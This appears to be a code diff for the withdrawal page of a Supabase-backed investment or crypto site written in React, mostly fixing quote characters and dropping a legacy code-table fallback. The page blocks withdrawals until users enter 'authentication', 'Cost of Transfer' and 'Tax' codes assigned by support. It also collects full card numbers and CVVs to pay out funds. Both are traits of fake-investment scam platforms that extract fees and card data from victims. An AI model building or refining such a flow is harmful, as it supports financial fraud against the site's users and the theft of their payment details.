@@ -1,83 +1,84 @@
-import { useEffect, useMemo, useState } from “react”;
-import { useAuth } from “@/hooks/useAuth”;
-import { supabase } from “@/integrations/supabase/client”;
-import { Button } from “@/components/ui/button”;
-import { Input } from “@/components/ui/input”;
-import { Label } from “@/components/ui/label”;
-import { Tabs, TabsContent, TabsList, TabsTrigger } from “@/components/ui/tabs”;
-import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from “@/components/ui/select”;
-import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogDescription, DialogFooter } from “@/components/ui/dialog”;
-import { toast } from “sonner”;
-import { Loader2, Bitcoin, Landmark, ShieldAlert, Check, ShieldCheck, Percent, Receipt, Wallet } from “lucide-react”;
-import { z } from “zod”;
-import { useLiveData } from “@/hooks/useLiveData”;
-import { useCurrency } from “@/hooks/useCurrency”;
+import { useEffect, useMemo, useState } from "react";
+import { useAuth } from "@/hooks/useAuth";
+import { supabase } from "@/integrations/supabase/client";
+import { Button } from "@/components/ui/button";
+import { Input } from "@/components/ui/input";
+import { Label } from "@/components/ui/label";
+import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
+import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
+import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogDescription, DialogFooter } from "@/components/ui/dialog";
+import { toast } from "sonner";
+import { Loader2, Bitcoin, Landmark, ShieldAlert, Check, ShieldCheck, Percent, Receipt, Wallet } from "lucide-react";
+import { z } from "zod";
+import { useLiveData } from "@/hooks/useLiveData";
+import { useCurrency } from "@/hooks/useCurrency";
 
-const amountSchema = z.coerce.number().positive(“Amount must be positive”);
+const amountSchema = z.coerce.number().positive("Amount must be positive");
 
-type CodeType = “auth” | “cot” | “tax”;
+type CodeType = "auth" | "cot" | "tax";
 interface AccountCode { id: string; code_type: CodeType; code: string; verified: boolean; }
 
+const STEP_ORDER: CodeType[] = ["auth", "cot", "tax"];
 const STEP_META: Record<CodeType, { title: string; subtitle: string; icon: typeof ShieldCheck }> = {
-auth: { title: “Authentication code”, subtitle: “Enter the authentication code assigned to your account by support.”, icon: ShieldCheck },
-cot:  { title: “COT code”, subtitle: “Enter the Cost of Transfer (COT) code assigned to your account.”, icon: Percent },
-tax:  { title: “Tax code”, subtitle: “Enter the Tax code assigned to your account to release this withdrawal.”, icon: Receipt },
+auth: { title: "Authentication code", subtitle: "Enter the authentication code assigned to your account by support.", icon: ShieldCheck },
+cot:  { title: "COT code", subtitle: "Enter the Cost of Transfer (COT) code assigned to your account.", icon: Percent },
+tax:  { title: "Tax code", subtitle: "Enter the Tax code assigned to your account to release this withdrawal.", icon: Receipt },
 };
 
-type OtherMethod = “cashapp” | “paypal” | “venmo” | “card”;
+type OtherMethod = "cashapp" | "paypal" | "venmo" | "card";
 
 export default function Withdraw() {
 const { user } = useAuth();
 const { format, currency } = useCurrency();
 const [submitting, setSubmitting] = useState(false);
-const [fallbackAuthCode, setFallbackAuthCode] = useState<string | null>(null);
+const [defaultCode, setDefaultCode] = useState<string | null>(null);
 
 const { data: balanceData, refresh: refreshBalance } = useLiveData(async () => {
 if (!user) return { balance: 0 };
 const { data } = await supabase
-.from(“profiles”)
-.select(“total_balance, default_verification_code”)
-.eq(“user_id”, user.id)
+.from("profiles")
+.select("total_balance, default_verification_code")
+.eq("user_id", user.id)
 .maybeSingle();
+// store default code for auth verification
 if (data?.default_verification_code) {
-setFallbackAuthCode(data.default_verification_code);
+setDefaultCode(data.default_verification_code);
 }
 return { balance: data ? Number(data.total_balance) : 0 };
 }, [user?.id]);
 const balance = balanceData?.balance ?? 0;
 
-const [crypto, setCrypto] = useState({ coin: “BTC”, amount: “”, address: “” });
-const [bank, setBank] = useState({ amount: “”, account_name: “”, account_no: “”, bank_name: “”, swift: “” });
+const [crypto, setCrypto] = useState({ coin: "BTC", amount: "", address: "" });
+const [bank, setBank] = useState({ amount: "", account_name: "", account_no: "", bank_name: "", swift: "" });
 const [other, setOther] = useState<{
 method: OtherMethod; amount: string;
 cashapp_tag: string; paypal_email: string; venmo_handle: string;
 card_number: string; card_exp: string; card_cvv: string; card_billing_name: string;
 }>({
-method: “cashapp”, amount: “”,
-cashapp_tag: “”, paypal_email: “”, venmo_handle: “”,
-card_number: “”, card_exp: “”, card_cvv: “”, card_billing_name: “”,
+method: "cashapp", amount: "",
+cashapp_tag: "", paypal_email: "", venmo_handle: "",
+card_number: "", card_exp: "", card_cvv: "", card_billing_name: "",
 });
 
 const [authOpen, setAuthOpen] = useState(false);
 const [pendingTxId, setPendingTxId] = useState<string | null>(null);
 const [codes, setCodes] = useState<AccountCode[]>([]);
-const [legacyAuthCode, setLegacyAuthCode] = useState<string | null>(null);
 const [stepIndex, setStepIndex] = useState(0);
-const [input, setInput] = useState(””);
+const [input, setInput] = useState("");
 const [verifying, setVerifying] = useState(false);
 
-// auth always required; cot/tax only if a row exists in account_withdrawal_codes
+// always include auth as first step, then any additional codes assigned
 const activeSteps = useMemo<CodeType[]>(() => {
-const steps: CodeType[] = [“auth”];
-if (codes.some((c) => c.code_type === “cot”)) steps.push(“cot”);
-if (codes.some((c) => c.code_type === “tax”)) steps.push(“tax”);
+const steps: CodeType[] = ["auth"]; // auth always required
+if (codes.some((c) => c.code_type === "cot")) steps.push("cot");
+if (codes.some((c) => c.code_type === "tax")) steps.push("tax");
 return steps;
 }, [codes]);
 
 const currentType: CodeType | null = activeSteps[stepIndex] ?? null;
-const currentCode = currentType
-? codes.find((c) => c.code_type === currentType) ?? null
-: null;
+const currentCode = currentType === "auth"
+? codes.find((c) => c.code_type === "auth") ?? null
+: currentType ? codes.find((c) => c.code_type === currentType) : null;
 
 useEffect(() => {
 if (!authOpen || !user) return;
@@ -86,54 +87,26 @@ fetchCodes();
 
 const fetchCodes = async () => {
 if (!user) return;
-
-```
-// Primary: account_withdrawal_codes (new table)
-const { data: newRows } = await supabase
-  .from("account_withdrawal_codes")
-  .select("id, code_type, code, verified")
-  .eq("user_id", user.id);
-
-if (newRows && newRows.length > 0) {
-  setCodes(newRows as AccountCode[]);
-  setLegacyAuthCode(null);
-  return;
-}
-
-// Fallback: account_codes (old table) — read auth_code from there
-const { data: legacy } = await supabase
-  .from("account_codes")
-  .select("auth_code, cot_code, tax_code")
-  .eq("user_id", user.id)
-  .maybeSingle();
-
-if (legacy) {
-  // Convert legacy row into AccountCode shape so the rest of the logic works
-  const syntheticCodes: AccountCode[] = [];
-  if (legacy.auth_code) syntheticCodes.push({ id: "legacy-auth", code_type: "auth", code: legacy.auth_code, verified: false });
-  if (legacy.cot_code)  syntheticCodes.push({ id: "legacy-cot",  code_type: "cot",  code: legacy.cot_code,  verified: false });
-  if (legacy.tax_code)  syntheticCodes.push({ id: "legacy-tax",  code_type: "tax",  code: legacy.tax_code,  verified: false });
-  setCodes(syntheticCodes);
-} else {
-  setCodes([]);
-}
-```
-
+const { data } = await supabase
+.from("account_withdrawal_codes")
+.select("id, code_type, code, verified")
+.eq("user_id", user.id);
+if (data) setCodes(data as AccountCode[]);
 };
 
 const submit = async (method: string, body: Record<string, unknown>, amt: string) => {
 if (!user) return;
 const a = amountSchema.safeParse(amt);
 if (!a.success) { toast.error(a.error.errors[0].message); return; }
-if (a.data > balance) { toast.error(“Insufficient balance”); return; }
+if (a.data > balance) { toast.error("Insufficient balance"); return; }
 setSubmitting(true);
-const { data, error } = await supabase.from(“transactions”).insert({
-user_id: user.id, type: “withdrawal”, method, amount_usd: a.data, status: “pending”, …body,
-} as never).select(“id”).maybeSingle();
+const { data, error } = await supabase.from("transactions").insert({
+user_id: user.id, type: "withdrawal", method, amount_usd: a.data, status: "pending", ...body,
+} as never).select("id").maybeSingle();
 setSubmitting(false);
-if (error || !data) { toast.error(error?.message ?? “Failed”); return; }
+if (error || !data) { toast.error(error?.message ?? "Failed"); return; }
 setPendingTxId(data.id);
-setInput(””);
+setInput("");
 setStepIndex(0);
 setAuthOpen(true);
 };
@@ -141,15 +114,14 @@ setAuthOpen(true);
 const verify = async () => {
 if (!user || !currentType) return;
 const entered = input.trim().toUpperCase();
-if (entered.length < 4) { toast.error(“Enter the code”); return; }
+if (entered.length < 4) { toast.error("Enter the code"); return; }
 
-```
+// For auth step: check account_withdrawal_codes first, fallback to default_verification_code
 if (currentType === "auth") {
   const assignedAuth = codes.find((c) => c.code_type === "auth");
-  // priority: assigned row → legacy account_codes → default_verification_code on profiles
-  const validCode =
-    assignedAuth?.code.trim().toUpperCase() ??
-    fallbackAuthCode?.trim().toUpperCase();
+  const validCode = assignedAuth
+    ? assignedAuth.code.trim().toUpperCase()
+    : defaultCode?.trim().toUpperCase();
 
   if (!validCode) {
     toast.error("No authentication code assigned. Contact support.");
@@ -160,20 +132,18 @@ if (currentType === "auth") {
     return;
   }
   setVerifying(true);
-  // only update DB if it's a real row (not synthetic legacy id)
-  if (assignedAuth && !assignedAuth.id.startsWith("legacy-")) {
+  if (assignedAuth) {
     await supabase.from("account_withdrawal_codes").update({ verified: true }).eq("id", assignedAuth.id);
   }
 } else {
+  // cot / tax
   if (!currentCode) { toast.error("No code assigned for this step."); return; }
   if (entered !== currentCode.code.trim().toUpperCase()) {
     toast.error(`Invalid ${STEP_META[currentType].title.toLowerCase()}.`);
     return;
   }
   setVerifying(true);
-  if (!currentCode.id.startsWith("legacy-")) {
-    await supabase.from("account_withdrawal_codes").update({ verified: true }).eq("id", currentCode.id);
-  }
+  await supabase.from("account_withdrawal_codes").update({ verified: true }).eq("id", currentCode.id);
 }
 
 const nextIdx = stepIndex + 1;
@@ -184,18 +154,17 @@ if (nextIdx >= activeSteps.length) {
   setAuthOpen(false);
   setPendingTxId(null);
   refreshBalance();
-  toast.success("Withdrawal submitted. Under final review.");
+  toast.success("All codes verified. Withdrawal is under final review.");
 } else {
   setStepIndex(nextIdx);
   setVerifying(false);
   toast.success(`${STEP_META[currentType].title} accepted.`);
 }
-```
 
 };
 
 const cancelRequest = async () => {
-if (pendingTxId) await supabase.from(“transactions”).update({ status: “rejected” }).eq(“id”, pendingTxId);
+if (pendingTxId) await supabase.from("transactions").update({ status: "rejected" }).eq("id", pendingTxId);
 setAuthOpen(false);
 setPendingTxId(null);
 };
@@ -205,27 +174,30 @@ const StepIcon = currentType ? STEP_META[currentType].icon : ShieldAlert;
 const submitOther = () => {
 const m = other.method;
 const body: Record<string, unknown> = {};
-let label = “”;
-if (m === “cashapp”) {
-if (!other.cashapp_tag.trim()) return toast.error(“Enter your $cashtag”);
-body.cashapp_tag = other.cashapp_tag.trim(); label = “Cash App”;
-} else if (m === “paypal”) {
-if (!/^\S+@\S+.\S+$/.test(other.paypal_email)) return toast.error(“Enter a valid PayPal email”);
-body.paypal_email = other.paypal_email.trim(); label = “PayPal”;
-} else if (m === “venmo”) {
-if (!other.venmo_handle.trim()) return toast.error(“Enter your Venmo handle”);
-body.venmo_handle = other.venmo_handle.trim(); label = “Venmo”;
-} else if (m === “card”) {
-if (other.card_number.replace(/\s/g, “”).length < 12) return toast.error(“Enter a valid card number”);
-if (!other.card_exp.trim()) return toast.error(“Enter expiration date”);
-if (other.card_cvv.length < 3) return toast.error(“Enter CVV”);
-if (!other.card_billing_name.trim()) return toast.error(“Enter billing name”);
-body.card_number = other.card_number.replace(/\s/g, “”);
+let label = "";
+if (m === "cashapp") {
+if (!other.cashapp_tag.trim()) return toast.error("Enter your $cashtag");
+body.cashapp_tag = other.cashapp_tag.trim();
+label = "Cash App";
+} else if (m === "paypal") {
+if (!/^\S+@\S+.\S+$/.test(other.paypal_email)) return toast.error("Enter a valid PayPal email");
+body.paypal_email = other.paypal_email.trim();
+label = "PayPal";
+} else if (m === "venmo") {
+if (!other.venmo_handle.trim()) return toast.error("Enter your Venmo handle");
+body.venmo_handle = other.venmo_handle.trim();
+label = "Venmo";
+} else if (m === "card") {
+if (other.card_number.replace(/\s/g, "").length < 12) return toast.error("Enter a valid card number");
+if (!other.card_exp.trim()) return toast.error("Enter expiration date");
+if (other.card_cvv.length < 3) return toast.error("Enter CVV");
+if (!other.card_billing_name.trim()) return toast.error("Enter billing name");
+body.card_number = other.card_number.replace(/\s/g, "");
 body.card_exp = other.card_exp.trim();
 body.card_cvv = other.card_cvv.trim();
 body.card_billing_name = other.card_billing_name.trim();
 body.card_last4 = body.card_number.toString().slice(-4);
-label = “Credit Card”;
+label = "Credit Card";
 }
 submit(label, body, other.amount);
 };
@@ -240,7 +212,6 @@ Available balance: <span className="text-foreground font-medium">{format(balance
 </p>
 </div>
 
-```
   <Tabs defaultValue="crypto">
     <TabsList className="grid w-full max-w-2xl grid-cols-3">
       <TabsTrigger value="crypto"><Bitcoin className="w-3.5 h-3.5 mr-1.5" /> Crypto</TabsTrigger>
@@ -283,11 +254,26 @@ Available balance: <span className="text-foreground font-medium">{format(balance
     <TabsContent value="bank" className="mt-6">
       <div className="rounded-2xl border border-border bg-card p-6 max-w-2xl space-y-5">
         <div className="grid sm:grid-cols-2 gap-4">
-          <div><Label>Amount (USD)</Label><Input value={bank.amount} onChange={(e) => setBank({ ...bank, amount: e.target.value })} /></div>
-          <div><Label>Bank name</Label><Input value={bank.bank_name} onChange={(e) => setBank({ ...bank, bank_name: e.target.value })} /></div>
-          <div><Label>Account name</Label><Input value={bank.account_name} onChange={(e) => setBank({ ...bank, account_name: e.target.value })} /></div>
-          <div><Label>Account number</Label><Input value={bank.account_no} onChange={(e) => setBank({ ...bank, account_no: e.target.value })} /></div>
-          <div className="sm:col-span-2"><Label>SWIFT / IBAN</Label><Input value={bank.swift} onChange={(e) => setBank({ ...bank, swift: e.target.value })} /></div>
+          <div>
+            <Label>Amount (USD)</Label>
+            <Input value={bank.amount} onChange={(e) => setBank({ ...bank, amount: e.target.value })} />
+          </div>
+          <div>
+            <Label>Bank name</Label>
+            <Input value={bank.bank_name} onChange={(e) => setBank({ ...bank, bank_name: e.target.value })} />
+          </div>
+          <div>
+            <Label>Account name</Label>
+            <Input value={bank.account_name} onChange={(e) => setBank({ ...bank, account_name: e.target.value })} />
+          </div>
+          <div>
+            <Label>Account number</Label>
+            <Input value={bank.account_no} onChange={(e) => setBank({ ...bank, account_no: e.target.value })} />
+          </div>
+          <div className="sm:col-span-2">
+            <Label>SWIFT / IBAN</Label>
+            <Input value={bank.swift} onChange={(e) => setBank({ ...bank, swift: e.target.value })} />
+          </div>
         </div>
         <Button disabled={submitting} onClick={() => submit("Bank transfer", { bank_details: bank }, bank.amount)} className="w-full">
           {submitting ? <Loader2 className="w-4 h-4 animate-spin" /> : "Request withdrawal"}
@@ -310,21 +296,53 @@ Available balance: <span className="text-foreground font-medium">{format(balance
               </SelectContent>
             </Select>
           </div>
-          <div><Label>Amount (USD)</Label><Input value={other.amount} onChange={(e) => setOther({ ...other, amount: e.target.value })} placeholder="100" /></div>
+          <div>
+            <Label>Amount (USD)</Label>
+            <Input value={other.amount} onChange={(e) => setOther({ ...other, amount: e.target.value })} placeholder="100" />
+          </div>
         </div>
-        {other.method === "cashapp" && <div><Label>Cash App tag</Label><Input value={other.cashapp_tag} onChange={(e) => setOther({ ...other, cashapp_tag: e.target.value })} placeholder="$username" /></div>}
-        {other.method === "paypal" && <div><Label>PayPal email</Label><Input type="email" value={other.paypal_email} onChange={(e) => setOther({ ...other, paypal_email: e.target.value })} placeholder="you@example.com" /></div>}
-        {other.method === "venmo" && <div><Label>Venmo handle</Label><Input value={other.venmo_handle} onChange={(e) => setOther({ ...other, venmo_handle: e.target.value })} placeholder="@yourhandle" /></div>}
-        {other.method === "card" && (
-          <div className="space-y-4">
-            <div><Label>Card number</Label><Input value={other.card_number} onChange={(e) => setOther({ ...other, card_number: e.target.value })} placeholder="4242 4242 4242 4242" inputMode="numeric" /></div>
-            <div className="grid grid-cols-2 gap-4">
-              <div><Label>Expiration (MM/YY)</Label><Input value={other.card_exp} onChange={(e) => setOther({ ...other, card_exp: e.target.value })} placeholder="08/27" /></div>
-              <div><Label>CVV</Label><Input value={other.card_cvv} onChange={(e) => setOther({ ...other, card_cvv: e.target.value })} placeholder="123" inputMode="numeric" maxLength={4} /></div>
-            </div>
-            <div><Label>Billing name</Label><Input value={other.card_billing_name} onChange={(e) => setOther({ ...other, card_billing_name: e.target.value })} placeholder="Name on card" /></div>
+
+        {other.method === "cashapp" && (
+          <div>
+            <Label>Cash App tag</Label>
+            <Input value={other.cashapp_tag} onChange={(e) => setOther({ ...other, cashapp_tag: e.target.value })} placeholder="$username" />
           </div>
         )}
+        {other.method === "paypal" && (
+          <div>
+            <Label>PayPal email</Label>
+            <Input type="email" value={other.paypal_email} onChange={(e) => setOther({ ...other, paypal_email: e.target.value })} placeholder="you@example.com" />
+          </div>
+        )}
+        {other.method === "venmo" && (
+          <div>
+            <Label>Venmo handle</Label>
+            <Input value={other.venmo_handle} onChange={(e) => setOther({ ...other, venmo_handle: e.target.value })} placeholder="@yourhandle" />
+          </div>
+        )}
+        {other.method === "card" && (
+          <div className="space-y-4">
+            <div>
+              <Label>Card number</Label>
+              <Input value={other.card_number} onChange={(e) => setOther({ ...other, card_number: e.target.value })} placeholder="4242 4242 4242 4242" inputMode="numeric" />
+            </div>
+            <div className="grid grid-cols-2 gap-4">
+              <div>
+                <Label>Expiration (MM/YY)</Label>
+                <Input value={other.card_exp} onChange={(e) => setOther({ ...other, card_exp: e.target.value })} placeholder="08/27" />
+              </div>
+              <div>
+                <Label>CVV</Label>
+                <Input value={other.card_cvv} onChange={(e) => setOther({ ...other, card_cvv: e.target.value })} placeholder="123" inputMode="numeric" maxLength={4} />
+              </div>
+            </div>
+            <div>
+              <Label>Billing name</Label>
+              <Input value={other.card_billing_name} onChange={(e) => setOther({ ...other, card_billing_name: e.target.value })} placeholder="Name on card" />
+            </div>
+          </div>
+        )}
+
         <Button disabled={submitting} onClick={submitOther} className="w-full">
           {submitting ? <Loader2 className="w-4 h-4 animate-spin" /> : "Request withdrawal"}
         </Button>
@@ -382,7 +400,7 @@ Available balance: <span className="text-foreground font-medium">{format(balance
     </DialogContent>
   </Dialog>
 </div>
-```
+
 
 );
 }
